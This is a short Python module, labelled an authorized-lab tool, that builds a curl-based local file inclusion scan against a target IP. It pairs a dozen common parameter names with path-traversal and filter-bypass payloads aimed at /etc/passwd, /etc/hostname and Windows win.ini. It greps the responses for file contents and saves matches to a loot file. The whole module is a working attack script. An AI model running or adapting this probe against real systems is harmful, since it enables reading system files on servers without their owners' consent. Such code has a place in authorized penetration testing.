"""Authorized-lab LFI file-read probe. No filter RCE / CNEXT."""
from __future__ import annotations

from pathlib import Path

PARAMS = (
    "file",
    "page",
    "view",
    "template",
    "path",
    "doc",
    "document",
    "bookurl",
    "include",
    "dir",
    "lang",
    "ticket",
)
FILES = (
    "/etc/passwd",
    "/etc/hostname",
    "C:\\Windows\\win.ini",
    "C:/Windows/win.ini",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
)
MARKERS = ("root:x:0:0", "[fonts]", "for 16-bit app support", "daemon:x:")


def probe_command(ip: str, loot: Path) -> str:
    out = loot / "lfi_hits.txt"
    parts = [
        f"echo '[*] LFI probe' > {out}",
    ]
    for param in PARAMS:
        for payload in FILES:
            parts.append(
                "code=$(curl -skL --max-time 8 -o /tmp/lfi_body -w '%{http_code}' "
                f"--get --data-urlencode '{param}={payload}' "
                f"http://{ip}/); "
                "if grep -Eq 'root:x:0:0|\\[fonts\\]|for 16-bit app support' /tmp/lfi_body; then "
                f"echo HIT {param}={payload} code=$code >> {out}; "
                f"head -c 400 /tmp/lfi_body >> {out}; echo >> {out}; fi"
            )
    parts.append(f"wc -l {out}; tail -20 {out}")
    return " ; ".join(parts)
